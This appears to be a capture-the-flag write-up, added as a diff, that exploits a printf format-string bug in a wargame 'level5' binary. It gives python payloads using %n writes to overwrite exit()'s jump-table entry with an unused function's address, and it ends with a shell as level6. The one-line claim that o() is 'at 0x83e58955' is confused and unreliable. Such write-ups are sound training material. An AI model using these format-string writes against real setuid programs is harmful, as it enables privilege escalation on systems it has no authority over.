@@ -1,0 +1,65 @@
+ll
+|
+L-> -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5*
+
+same as previous it wait input and print 512 char of it
+
+I objdump on it and see that system() is called in a o() function wich is never called, so we need to call it 
+
+at the end of n() we have
+
+   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:    mov    %eax,(%esp)
+   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:    movl   $0x1,(%esp)
+   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+
+and we see that o() is at 0x83e58955
+
+so we probably can edit the call value of n() from 0x80483d0 to 0x83e58955
+
+
+let's try to find out if we can print the 0x80483d0 address
+
+python -c 'print "\xd0\x83\x04\x08" + " %x %x %x %x %x %x %x %x %x"' | ./level5
+|
+L-> Ѓ 200 b7fd1ac0 b7ff37d0 80483d0 20782520 25207825 78252078 20782520 25207825
+                            ^^^^^^^
+
+
+here it is at the 4th position
+
+let's get the value of 0x080484a4
+
+gdb level5
+(gdb) break main
+(gdb) r
+(gdb) print 0x080484a4
+|
+L-> $0 = 134513828
+
+so we got 134513828 -4 bytes of the address, so we have this command:
+
+python -c 'print "\xa4\x84\x04\x08" + "%0134513824x%4$n"' > /tmp/exploit
+
+cat /tmp/exploit - | ./level5
+
+after a long moment we can do an id
+
+segfault... maybe we change the wrong address
+
+getting back in gdb
+we disass the exit()
+
+(gdb) disass 0x80483d0
+|
+L-> 0x080483d0 <+0>:     jmp    *0x8049838
+
+let's try to override this address
+
+python -c 'print "\x38\x98\x04\x08" + "%0134513824x%4$n"' > /tmp/exploit2
+
+cat /tmp/exploit2 - | ./level5
+
+bingo, after a while we got a shell as level6
